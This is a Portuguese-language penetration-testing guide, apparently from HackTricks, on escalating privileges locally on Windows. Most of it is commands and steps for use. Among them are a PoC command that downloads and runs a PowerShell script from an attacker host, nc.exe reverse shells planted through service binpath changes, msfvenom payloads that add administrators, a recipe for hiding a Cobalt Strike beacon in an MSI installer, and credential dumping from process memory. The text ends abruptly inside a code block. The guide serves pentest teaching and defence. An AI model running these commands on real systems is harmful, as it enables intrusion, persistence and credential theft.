# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Melhor ferramenta para procurar vetores de escalada de privilégio local no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Access Tokens

**Se você não sabe o que são Windows Access Tokens, leia a seguinte página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Verifique a seguinte página para mais informações sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se você não sabe o que são integrity levels no Windows, você deve ler a seguinte página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de Segurança do Windows

Existem diferentes coisas no Windows que poderiam **impedir você de enumerar o sistema**, executar executáveis ou até mesmo **detectar suas atividades**. Você deve **ler** a seguinte **página** e **enumerar** todos esses **mecanismos de defesa** antes de começar a enumeração de escalada de privilégio:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Processos UIAccess lançados por meio de `RAiLaunchAdminProcess` podem ser abusados para alcançar High IL sem prompts quando as verificações de secure-path do AppInfo são contornadas. Veja o fluxo dedicado de bypass de UIAccess/Admin Protection aqui:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

A propagação de acessibilidade do registro no Secure Desktop pode ser abusada para uma gravação arbitrária no registro como SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

As builds recentes do Windows também introduziram um caminho de LPE de **SMB arbitrary-port** onde uma autenticação NTLM local privilegiada é refletida por uma conexão TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Verifique se a versão do Windows tem alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para buscar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Esta base de dados tem mais de 4.700 vulnerabilidades de segurança, mostrando a **enorme superfície de ataque** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localmente com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositórios do Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Alguma credencial/informação juicy salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de Transcript do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Logging de Módulo do PowerShell

Detalhes das execuções do pipeline do PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. No entanto, detalhes completos da execução e os resultados da saída podem não ser capturados.

Para habilitar isso, siga as instruções na seção "Transcript files" da documentação, optando por **"Module Logging"** em vez de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver os últimos 15 eventos dos logs do PowersShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Um registro completo da atividade e do conteúdo total da execução do script é capturado, garantindo que cada bloco de código seja documentado enquanto é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para forense e análise de comportamento malicioso. Ao documentar toda a atividade no momento da execução, são fornecidos insights detalhados sobre o processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de logging para o Script Block podem ser localizados no Windows Event Viewer no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver os últimos 20 eventos, você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações da Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S**, mas http.

Você começa verificando se a rede usa uma atualização WSUS sem SSL executando o seguinte no cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou o seguinte em PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se você receber uma resposta como uma destas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` for igual a `1`.

Então, **é explorável.** Se o último registry for igual a 0, então a entrada do WSUS será ignorada.

Para explorar essas vulnerabilities, você pode usar tools como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- estes são scripts de exploits weaponized de MiTM para injetar updates 'falsos' no tráfego WSUS sem SSL.

Leia a research aqui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leia o report completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, esta é a flaw que este bug explora:

> Se tivermos o poder de modificar nosso proxy local do user, e o Windows Updates usa o proxy configurado nas settings do Internet Explorer, então temos o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar code como um user elevated em nosso asset.
>
> Além disso, como o serviço WSUS usa as settings do current user, ele também usará seu certificate store. Se gerarmos um self-signed certificate para o hostname do WSUS e adicionarmos esse certificate ao certificate store do current user, conseguiremos interceptar tanto o tráfego HTTP quanto HTTPS do WSUS. O WSUS não usa mecanismos tipo HSTS para implementar uma validação trust-on-first-use no certificate. Se o certificate apresentado for trusted pelo user e tiver o hostname correto, ele será aceito pelo service.

Você pode explorar essa vulnerability usando a tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (assim que ela for liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muitos enterprise agents expõem uma superfície localhost IPC e um canal de atualização privilegiado. Se o enrollment puder ser coagido para um servidor atacante e o updater confiar em uma root CA rogue ou em weak signer checks, um user local pode entregar um MSI malicioso que o service SYSTEM instala. Veja uma técnica generalized (baseada na chain Netskope stAgentSvc – CVE-2025-0309) aqui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expõe um service localhost na **TCP/9401** que processa messages controladas pelo attacker, permitindo comandos arbitrários como **NT AUTHORITY\SYSTEM**.

- **Recon**: confirme o listener e a version, por exemplo, `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloque um PoC como `VeeamHax.exe` com as DLLs do Veeam necessárias no mesmo diretório e então acione um payload SYSTEM via o socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
O serviço executa o comando como SYSTEM.
## KrbRelayUp

Uma vulnerabilidade de **local privilege escalation** existe em ambientes Windows de **domain** sob condições específicas. Essas condições incluem ambientes onde a **LDAP signing is not enforced,** usuários possuem self-rights que permitem configurar **Resource-Based Constrained Delegation (RBCD),** e a capacidade de usuários criarem computadores dentro do domain. É importante notar que esses **requirements** são atendidos usando **default settings**.

Encontre o **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para mais informações sobre o fluxo do ataque, confira [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registers estiverem **enabled** (valor é **0x1**), então usuários de qualquer privilégio podem **install** (executar) `*.msi` files como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### payloads do Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão meterpreter, pode automatizar essa técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário MSI do Windows para escalar privilégios. Este script gera um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (então você precisará de acesso GIU):
```
Write-UserAddMSI
```
Apenas execute o binário criado para elevar privilégios.

### MSI Wrapper

Leia este tutorial para aprender como criar um MSI wrapper usando esta ferramenta. Observe que você pode empacotar um arquivo "**.bat**" se você **apenas** quiser **executar** linhas de comando


{{#ref}}
msi-wrapper.md
{{#endref}}

### Criar MSI com WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Criar MSI com Visual Studio

- **Gere** com Cobalt Strike ou Metasploit um **novo Windows EXE TCP payload** em `C:\privesc\beacon.exe`
- Abra o **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Next**.
- Dê ao projeto um nome, como **AlwaysPrivesc**, use **`C:\privesc`** como local, selecione **place solution and project in the same directory** e clique em **Create**.
- Continue clicando em **Next** até chegar ao passo 3 de 4 (choose files to include). Clique em **Add** e selecione o Beacon payload que você acabou de gerar. Depois clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e, em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
- Há outras propriedades que você pode alterar, como **Author** e **Manufacturer**, que podem fazer o aplicativo instalado parecer mais legítimo.
- Clique com o botão direito no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito em **Install** e selecione **Add Custom Action**.
- Dê um duplo clique em **Application Folder**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o beacon payload seja executado assim que o instalador for executado.
- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
- Por fim, **build it**.
- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de definir a plataforma como x64.

### Instalação MSI

Para executar a **instalação** do arquivo `.msi` malicioso em **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar esta vulnerabilidade você pode usar: _exploit/windows/local/always_install_elevated_

## Antivirus e Detectors

### Audit Settings

Essas configurações decidem o que está sendo **logged**, então você deve prestar atenção
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, é interessante saber para onde os logs são enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** é projetado para o **gerenciamento de senhas do Administrador local**, garantindo que cada senha seja **única, aleatória e atualizada regularmente** em computadores ingressados em um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que receberam permissões suficientes por meio de ACLs, permitindo que visualizem as senhas do admin local se autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se estiver ativo, **senhas em texto simples são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Proteção LSA

A partir do **Windows 8.1**, a Microsoft introduziu proteção aprimorada para a Local Security Authority (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, reforçando ainda mais a segurança do sistema.\
[**Mais informações sobre a Proteção LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciais em cache

**Credenciais de domínio** são autenticadas pela **Local Security Authority** (LSA) e utilizadas por componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, credenciais de domínio para o usuário geralmente são estabelecidas.\
[**Mais informações sobre Cached Credentials aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

Você deve verificar se algum dos grupos aos quais você pertence tem permissões interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se você **pertence a algum grupo privilegiado, pode ser capaz de elevar privilégios**. Saiba mais sobre grupos privilegiados e como abusar deles para elevar privilégios aqui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulação de token

**Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Confira a seguinte página para **aprender sobre tokens interessantes** e como abusar deles:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuários logados / Sessões
```bash
qwinsta
klist sessions
```
### Pastas home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de Senhas
```bash
net accounts
```
### Obter o conteúdo da clipboard
```bash
powershell -command "Get-Clipboard"
```
## Processos em Execução

### Permissões de Arquivo e Pasta

Antes de tudo, ao listar os processos, **verifique se há senhas dentro da linha de comando do processo**.\
Verifique se você pode **sobrescrever algum binário em execução** ou se tem permissões de escrita na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique por possíveis [**electron/cef/chromium debuggers** em execução, você poderia abusar disso para elevar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando as permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando as permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mineração de senhas na memória

Você pode criar um dump de memória de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credentials em texto claro na memória**, tente fazer o dump da memória e ler as credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicativos GUI inseguros

**Aplicativos em execução como SYSTEM podem permitir que um usuário abra um CMD ou navegue por diretórios.**

Exemplo: "Windows Help and Support" (Windows + F1), pesquise por "command prompt", clique em "Click to open Command Prompt"

## Serviços

Service Triggers permitem que o Windows inicie um serviço quando certas condições ocorrem (atividade de named pipe/RPC endpoint, eventos ETW, disponibilidade de IP, chegada de dispositivo, atualização de GPO, etc.). Mesmo sem direitos SERVICE_START, você muitas vezes pode iniciar serviços privilegiados acionando seus triggers. Veja técnicas de enumeração e ativação aqui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenha uma lista de serviços:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações de um serviço
```bash
sc qc <service_name>
```
É recomendável ter o binário **accesschk** da _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
É recomendado verificar se "Authenticated Users" podem modificar qualquer serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar serviço

Se você estiver tendo este erro (por exemplo com SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Você pode habilitá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em conta que o serviço upnphost depende de SSDPSRV para funcionar (para XP SP1)**

**Outra workaround** desse problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar caminho binário do serviço**

No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilégios podem ser escalados através de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite a reconfiguração do binário do service.
- **WRITE_DAC**: Habilita a reconfiguração de permissões, levando à capacidade de alterar as configurações do service.
- **WRITE_OWNER**: Permite a aquisição de ownership e a reconfiguração de permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar as configurações do service.
- **GENERIC_ALL**: Também herda a capacidade de alterar as configurações do service.

Para a detecção e exploração desta vulnerabilidade, o _exploit/windows/local/service_permissions_ pode ser utilizado.

### Services binaries weak permissions

**Verifique se você pode modificar o binary executado por um service** ou se você tem **write permissions na pasta** onde o binary está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Você pode obter cada binary executado por um service usando **wmic** (não em system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissões para modificar o registry de serviços

Você deve verificar se pode modificar algum registry de serviço.\
Você pode **verificar** suas **permissões** sobre um **registry** de serviço fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Deve ser verificado se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões de `FullControl`. Se sim, o binário executado pelo service pode ser alterado.

Para alterar o Path do binário executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Corrida de symlink do Registry para escrita arbitrária de valor HKLM (ATConfig)

Alguns recursos de Acessibilidade do Windows criam chaves **ATConfig** por usuário que depois são copiadas por um processo **SYSTEM** para uma chave de sessão em HKLM. Uma **corrida de symbolic link** no registry pode redirecionar essa escrita privilegiada para **qualquer path HKLM**, dando uma primitive de **arbitrary HKLM value write**.

Locais-chave (exemplo: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista os recursos de acessibilidade instalados.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` armazena configuração controlada pelo usuário.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` é criada durante transições de logon/secure-desktop e pode ser escrita pelo usuário.

Fluxo de abuso (CVE-2026-24291 / ATConfig):

1. Preencha o valor **HKCU ATConfig** que você quer que seja escrito por SYSTEM.
2. Dispare a cópia do secure-desktop (por exemplo, **LockWorkstation**), que inicia o fluxo do AT broker.
3. **Vença a corrida** colocando um **oplock** em `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando o oplock disparar, substitua a chave **HKLM Session ATConfig** por um **registry link** para um target protegido em HKLM.
4. SYSTEM grava o valor escolhido pelo atacante no path HKLM redirecionado.

Depois que você tiver escrita arbitrária de valor em HKLM, faça pivot para LPE sobrescrevendo valores de configuração de serviço:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Escolha um serviço que um usuário normal possa iniciar (por exemplo, **`msiserver`**) e dispare-o após a escrita. **Nota:** a implementação pública do exploit **trava a workstation** como parte da corrida.

Exemplo de tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissões AppendData/AddSubdirectory do registro de Services

Se você tiver essa permissão sobre um registro, isso significa que **você pode criar sub-registros a partir dele**. No caso de Windows services, isso é **suficiente para executar código arbitrário:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada final antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentará executar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste todos os unquoted service paths, excluindo aqueles pertencentes a serviços internos do Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** esta vulnerabilidade com metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binary de serviço com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ações de Recuperação

O Windows permite que os usuários especifiquem ações a serem tomadas se um serviço falhar. Esse recurso pode ser configurado para apontar para um binário. Se esse binário puder ser substituído, pode ser possível fazer privilege escalation. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Verifique as **permissões dos binários** (talvez você consiga sobrescrever um e fazer privilege escalation) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Verifique se você pode modificar algum arquivo de config para ler algum arquivo especial ou se você pode modificar algum binário que será executado por uma conta de Administrator (schedtasks).

Uma forma de encontrar permissões fracas de pasta/arquivo no sistema é fazendo:
```bash
